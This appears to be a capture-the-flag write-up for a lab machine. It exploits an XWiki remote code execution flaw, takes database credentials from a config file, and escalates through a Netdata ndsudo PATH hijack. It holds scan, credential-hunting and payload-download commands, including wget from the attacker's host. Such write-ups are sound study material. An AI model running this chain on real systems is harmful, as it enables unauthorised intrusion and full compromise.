## 1.Reconnasiance

### Port Scan
we began b scanning the target for open ports and running services.
```bash
nmap -sCV -T4 -A -o scan.txt <TARGET_IP>
```

Findings:
Port 22 -- running ssh service
port 80 -- running nginx server
port 8080  -- runing jetty server

## 2. Web Analysis

We navigated to the port 80 and there is nothing useful in it.
![alt text](Editor/images/website.png)

We navigated to the port 8080 and there is Xwiki service running.
![alt text](Editor/images/website2.png)

We identified the version as Xwiki 15.10.8

## Vulnerabilty Search

A search for version related vulnerabilty:
CVE-2025-24893: Unauthenticated Remote Code Execution
Technical Breakdwon: XWiki includes a macro called SolrSearch (defined in Main.SolrSearchMacros) that enables full-text search through the embedded Solr engine. The vulnerability stems from the way this macro evaluates search parameters in Groovy, failing to sanitize or restrict malicious input.
Impact:  Attackers can execute arbitrary code on the server, compromising confidentiality, integrity, and availability.
Reference: https://www.offsec.com/blog/cve-2025-24893/

## User Exploitation

### CVE-2025-24893

I used the PoC from the github repository for exploitation.

```bash
git clone https://github.com/gunzf0x/CVE-2025-24893.git
```
![alt text](Editor/images/exploitation.png)

upon executing the script i got callback on my listener.


### Enemuration

I check for usernmaes in /etc/passwd and i found a user 'Oliver'.
![alt text](Editor/images/post-exploitation.png)

I ran grep command to look for files containg string password.
```bash
grep --color=auto -rli "password" /etc 2>dev/null
```
![alt text](Editor/exploitation2.png)

I found the file /etc/xwiki/hibernate/cfg/xml. This is a configuration file that tells Xwiki how to connect to MYSQL Database.

```bash
cat /etc/xwiki/hibernate.cfg.xml
```
![alt text](Editor/images/exploitation3.png)

Here i found the cleartext credentials for the database.
Password: "theEd1t0rTeam99"

###User flag

I tried to login using the credentials via SSH:
Username: "Oliver"
Password: "theEd1t0rTeam99"
Then I got the user flag 
![alt text](Editor/images/flag.png)

## Privilige Escalati0on

### Enemuraton for Root 

I checked my id and groups as 'oliver' user

```bash
id
groups
```

Oliver was a member of netdata group.

### SUID files

```bash
find / -perm -u=s -type f 2>/dev/null
```

This command will search for files owned by root.
![alt text](Editor/images/escalation.png)

We found a few files but after from searching I found ndsudo is an important file in netdata.
Let's try to check the version of the netdata
![alt text](Editor/images/escalation2.png)

Let's check for this version vulnerabilities.

###CVE-2024–32019 (Root.txt)

CVE-2024–32019 is a local privilege-escalation flaw in Netdata’s SUID helper ndsudo that lets a local user execute arbitrary programs as root via an untrusted search path (PATH hijacking). The issue exists because ndsudo restricts command names but resolves them using the caller’s PATH, allowing a user to place a malicious binary earlier in PATH and have ndsudo run it with root privileges. It affects Netdata Agent versions ≥ v1.45.0 and < v1.45.3, and ≥ v1.44.0–60 and < v1.45.0–169, and carries a CVSS v3.1 score of 8.8 (High).

Resource: https://securityvulnerability.io/vulnerability/CVE-2024-32019

We will use this PoC to exploit 
https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC

```bash
git clone https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC.git

#Compile the payload 
gcc -static payload.c -o nvme -Wall -Werror -Wpedantic

#host the files on kali machine 
python3 -m http.server 8000

#Download the exploit and payload to the victim machine

wget http://{tun-ip}:8000/CVE-2024-32019.sh
wget http://{tun-ip}:8000/nvme

#Make the expolit executable

chmod +x CVE-2024-32019.sh

#execute the exploit
./CVE-2024-32019
```

![alt text](Editor/images/root.png)

![alt text](Editor/images/root-flag.png)

We escalated to the root and found the root flag.


